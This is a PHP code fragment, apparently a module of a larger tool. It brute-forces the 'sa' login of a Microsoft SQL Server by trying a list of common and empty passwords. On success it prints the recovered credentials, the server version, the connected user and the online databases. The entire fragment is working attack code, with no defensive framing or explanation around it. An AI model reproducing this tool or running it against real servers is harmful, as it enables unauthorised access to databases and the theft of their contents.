ob_start();

if (!extension_loaded('sqlsrv')) {
    ob_end_clean();
    return "ERROR: sqlsrv extension not available (Windows only)";
}

$host = '127.0.0.1';
$port = 1433;
$username = 'sa';
$delay = 1;

$passwords = [
    '',
    'sa',
    'password',
    '123456',
    'admin',
    'mssql',
    'sql',
    'root',
    '123456789',
    'letmein'
];

try {
    $success = false;
    $attempted = 0;
    $output = "[+] Starting MSSQL brute-force on $host:$port\n";
    $output .= "[+] Target user: $username\n";
    $output .= "[+] Passwords to try: " . count($passwords) . "\n\n";

    foreach ($passwords as $pwd) {
        $attempted++;
        $output .= "[$attempted] Trying: '$pwd' ... ";

        $server = "$host,$port"; // Syntaxe requise par sqlsrv
        $conn = @sqlsrv_connect($server, [
            'UID'      => $username,
            'PWD'      => $pwd,
            'Database' => 'master',
            'LoginTimeout' => 3,
            'QueryTimeout' => 5
        ]);

        if (!$conn) {

            $errors = sqlsrv_errors();
            if ($errors) {
                foreach ($errors as $error) {
                    $msg = $error['message'] ?? '';

                    if (strpos($msg, '08001') !== false || // SQL Server Network Interfaces
                        strpos($msg, 'TCP Provider') !== false ||
                        strpos($msg, 'Login timeout expired') !== false) {
                        if ($attempted === 1) {
                            ob_end_clean();
                            return "ERROR: Cannot connect to MSSQL ($host:$port) - service down, filtered, or unreachable";
                        }
                    }
                }
            }
            $output .= "FAILED (Access denied or invalid credentials)\n";
        } else {
            $output .= "SUCCESS!\n";
            $output .= "\n[+] CREDENTIALS FOUND:\n";
            $output .= "    Host: $host:$port\n";
            $output .= "    User: $username\n";
            $output .= "    Pass: " . ($pwd === '' ? '(empty)' : $pwd) . "\n\n";

            $stmt = sqlsrv_query($conn, "SELECT @@VERSION");
            $version = 'unknown';
            if ($stmt && sqlsrv_fetch($stmt)) {
                $version = sqlsrv_get_field($stmt, 0) ?: 'unknown';
            }

            $stmt = sqlsrv_query($conn, "SELECT SYSTEM_USER");
            $current_user = 'unknown';
            if ($stmt && sqlsrv_fetch($stmt)) {
                $current_user = sqlsrv_get_field($stmt, 0) ?: 'unknown';
            }

            $stmt = sqlsrv_query($conn, "SELECT name FROM sys.databases WHERE state = 0");
            $dbs = [];
            if ($stmt) {
                while (sqlsrv_fetch($stmt)) {
                    $dbs[] = sqlsrv_get_field($stmt, 0);
                }
            }

            $output .= "[+] MSSQL Version: " . substr($version, 0, 80) . "\n";
            $output .= "[+] Connected as: $current_user\n";
            $output .= "[+] Online Databases:\n    - " . implode("\n    - ", array_slice($dbs, 0, 10));
            if (count($dbs) > 10) {
                $output .= "\n    ... (+ " . (count($dbs) - 10) . " more)";
            }
            $output .= "\n";

            sqlsrv_close($conn);
            $success = true;
            break;
        }

        if ($conn) {
            sqlsrv_close($conn);
        }

        if (!$success && $attempted < count($passwords)) {
            sleep($delay);
        }
    }

    if (!$success) {
        $output .= "\n[!] No valid password found.\n";
    }

    ob_end_clean();
    return $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: MSSQL brute-force failed - " . $e->getMessage();
}
